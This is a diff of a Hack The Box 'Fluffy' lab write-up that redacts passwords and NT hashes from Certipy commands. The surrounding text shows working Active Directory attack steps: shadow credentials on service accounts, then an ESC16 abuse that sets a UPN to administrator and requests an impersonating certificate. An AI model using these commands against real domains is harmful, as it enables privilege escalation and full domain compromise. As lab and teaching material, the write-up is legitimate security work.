@@ -182,7 +182,7 @@ $krb5tgs$23$*winrm_svc$FLUFFY.HTB$fluffy.htb/winrm_svc*$070a879061ab7cede443c74c
 Unfortunately, none of these crack which means we must add a shadow credential to gain access to each account. I'll use [Certipy-AD's](https://github.com/ly4k/Certipy) shadow module in order to speed things up here.
 
 ```
-$ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account winrm_svc
+$ certipy shadow auto -u p.agila@fluffy.htb -p [REDACTED] -account winrm_svc
 Certipy v4.8.2 - by Oliver Lyak (ly4k)
 
 [*] Targeting user 'winrm_svc'
@@ -203,7 +203,7 @@ Certipy v4.8.2 - by Oliver Lyak (ly4k)
 [*] NT hash for 'winrm_svc': [REDACTED]
 
 ------------------------------------------------------------------------------
-$ certipy shadow auto -u p.agila@fluffy.htb -p prometheusx-303 -account ca_svc
+$ certipy shadow auto -u p.agila@fluffy.htb -p [REDACTED] -account ca_svc
 [...]
 [*] NT hash for 'ca_svc': [REDACTED]
 ```
@@ -285,7 +285,7 @@ We then request a client authentication certificate from a vulnerable CA, which 
 Seeing as how we have an NTLM hash for the _WINRM_SVC_ account, I'll use authenticate as them and use the _CA_SVC_ account to carry out ESC16, since they have sufficient permissions to do so. I start by updating _CA_SVC_ to have a UPN of administrator, effectively impersonating them.
 
 ```
-$ certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc -upn administrator update
+$ certipy-ad account -u winrm_svc@fluffy.htb -hashes [REDACTED] -user ca_svc -upn administrator update
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: All nameservers failed to answer the query FLUFFY.HTB. IN A: Server Do53:192.168.172.2@53 answered SERVFAIL
@@ -294,7 +294,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
     userPrincipalName                   : administrator
 [*] Successfully updated 'ca_svc'
                                                                                                                                              
-$ certipy-ad account -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 -user ca_svc read
+$ certipy-ad account -u winrm_svc@fluffy.htb -hashes [REDACTED] -user ca_svc read
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [!] DNS resolution failed: All nameservers failed to answer the query FLUFFY.HTB. IN A: Server Do53:192.168.172.2@53 answered SERVFAIL
@@ -315,7 +315,7 @@ Certipy v5.0.4 - by Oliver Lyak (ly4k)
 Now we need to request a template as _CA_SVC_ to grab a certificate on behalf of the administrator. If properly configured, AD CS would not trust the mismatched UPN and block this request, however we are given the green light here.
 
 ```
-$ certipy-ad req -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8 -dc-ip 10.129.23.217 -ca fluffy-DC01-CA -template User
+$ certipy-ad req -u ca_svc -hashes [REDACTED] -dc-ip 10.129.23.217 -ca fluffy-DC01-CA -template User
 Certipy v5.0.4 - by Oliver Lyak (ly4k)
 
 [*] Requesting certificate via RPC
